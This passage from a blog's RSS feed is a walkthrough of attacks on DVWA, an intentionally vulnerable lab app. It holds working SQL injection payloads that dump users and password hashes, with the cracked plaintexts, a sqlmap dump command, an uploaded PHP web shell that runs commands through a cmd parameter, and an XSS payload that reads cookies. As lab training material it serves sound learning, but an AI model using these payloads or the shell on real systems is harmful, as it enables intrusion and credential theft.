First name: user
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: password
Surname: 

ID: &#39; union select column_name,null from information_schema.columns where table_name=&#39;users&#39;-- -
First name: avatar
Surname: 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;&lt;code&gt;&#39; union select user, password from users-- -&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ID: &#39; union select user, password from users-- -
First name: admin
Surname: 098f6bcd4621d373cade4e832627b4f6

ID: &#39; union select user, password from users-- -
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: &#39; union select user, password from users-- -
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: &#39; union select user, password from users-- -
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: &#39; union select user, password from users-- -
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks like the passwords are MD5 hashed. However, they are easily found to be &lt;code&gt;test&lt;/code&gt;, &lt;code&gt;abc123&lt;/code&gt;, &lt;code&gt;charley&lt;/code&gt;, &lt;code&gt;letmein&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt; respectively.&lt;/p&gt;

&lt;h2 id=&#34;5-2-sql-injection-blind:a278ed06f786dfe478032a0f72deba1a&#34;&gt;5.2 SQL Injection(Blind)&lt;/h2&gt;

&lt;p&gt;The blind SQL injection case uses the same vulnerable SQL query. The only difference is that the errors (from MySQL) are not shown to the user.
We can use &lt;code&gt;sqlmap&lt;/code&gt; to automate SQL injection exploitation (especially in blind injection cases where injection uses MANY boolean or time based queries)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;sqlmap -u &amp;quot;http://192.168.52.129/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&amp;quot; --cookie=&amp;quot;security=low; PHPSESSID=872eb7bf8ffde53b4d00d3c1a5df9a28&amp;quot; --dump

Database: dvwa
Table: users
[5 entries]
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| user_id | user    | avatar                                                | password                         | last_name | first_name |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
| 1       | admin   | http://192.168.52.129/dvwa/hackable/users/admin.jpg   | 098f6bcd4621d373cade4e832627b4f6 | admin     | admin      |
| 2       | gordonb | http://192.168.52.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 | Brown     | Gordon     |
| 3       | 1337    | http://192.168.52.129/dvwa/hackable/users/1337.jpg    | 8d3533d75ae2c3966d7e0d4fcc69216b | Me        | Hack       |
| 4       | pablo   | http://192.168.52.129/dvwa/hackable/users/pablo.jpg   | 0d107d09f5bbe40cade3de5c71e9e9b7 | Picasso   | Pablo      |
| 5       | smithy  | http://192.168.52.129/dvwa/hackable/users/smithy.jpg  | 5f4dcc3b5aa765d61d8327deb882cf99 | Smith     | Bob        |
+---------+---------+-------------------------------------------------------+----------------------------------+-----------+------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;6-file-upload:a278ed06f786dfe478032a0f72deba1a&#34;&gt;6. File Upload&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/up.png&#34; alt=&#34;File Upload&#34; /&gt;&lt;/p&gt;

&lt;p&gt;On the low security setting there are no restrictions on file upload. We can upload a php file containing simple code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
if(isset($_REQUEST[&#39;cmd&#39;])){
    $cmd = ($_REQUEST[&amp;quot;cmd&amp;quot;]);
    system($cmd);
    echo &amp;quot;&amp;lt;/pre&amp;gt;$cmd&amp;lt;pre&amp;gt;&amp;quot;;
    die;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;../../hackable/uploads/shell.php succesfully uploaded!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;We can execute commands now via this shell:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://192.168.52.129/dvwa/hackable/uploads/shell.php?cmd=ls -al&lt;/code&gt;&lt;/p&gt;

&lt;h2 id=&#34;7-1-reflected-xss:a278ed06f786dfe478032a0f72deba1a&#34;&gt;7.1 Reflected XSS&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/xss.png&#34; alt=&#34;XSS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here whatever we enter gets included into page source.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/cookie.png&#34; alt=&#34;Cookie&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;7-2-stored-xss:a278ed06f786dfe478032a0f72deba1a&#34;&gt;7.2 Stored XSS&lt;/h2&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/xss2.png&#34; alt=&#34;XSS&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Here the app is vulnerable to XSS again. However, this time the injected code is stored inside the database and is executed every time somebody visits the guestbook page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://mislusnys.github.io/images/stored.png&#34; alt=&#34;Stored XSS&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;summary:a278ed06f786dfe478032a0f72deba1a&#34;&gt;Summary&lt;/h2&gt;

&lt;p&gt;DVWA includes most common web server vulnerabilities and provides easy access to the vulnerable pieces of code. It is a great package for a beginner level pentest demo.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>